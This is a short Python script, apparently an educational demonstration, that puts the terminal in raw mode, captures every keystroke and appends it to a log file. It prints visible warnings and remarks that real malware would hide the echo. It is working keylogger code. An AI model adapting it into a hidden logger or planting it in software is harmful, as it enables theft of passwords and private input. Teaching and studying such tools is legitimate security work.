import sys
import tty
import termios

print("-" * 50)
print("[!] Terminal Keylogger Active.")
print("[!] Start typing. Everything you type is being intercepted!")
print("[!] Press 'q' to quit.")
print("-" * 50)

# This will hold the file where keystrokes are saved
log_file = "key_log.txt"

# Save the original terminal settings
orig_settings = termios.tcgetattr(sys.stdin)

try:
    # Put terminal in raw mode so it captures keys instantly without waiting for "Enter"
    tty.setraw(sys.stdin)
    
    with open(log_file, "a") as f:
        f.write("\n--- New Keylogger Session ---\n")
        
        while True:
            # Read a single character from the keyboard
            char = sys.stdin.read(1)
            
            # If the user presses 'q', stop the keylogger
            if char == 'q':
                break
                
            # Log the character to our hidden file
            f.write(char)
            f.flush() # Instantly write to disk
            
            # Print it to screen so the user can see what they are typing
            # (In real malware, this part would be completely hidden!)
            sys.stdout.write(char)
            sys.stdout.flush()

finally:
    # Always restore the original terminal settings when finished
    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, orig_settings)

print(f"\n\n[+] Keylogger stopped. Keystrokes saved to '{log_file}'!")
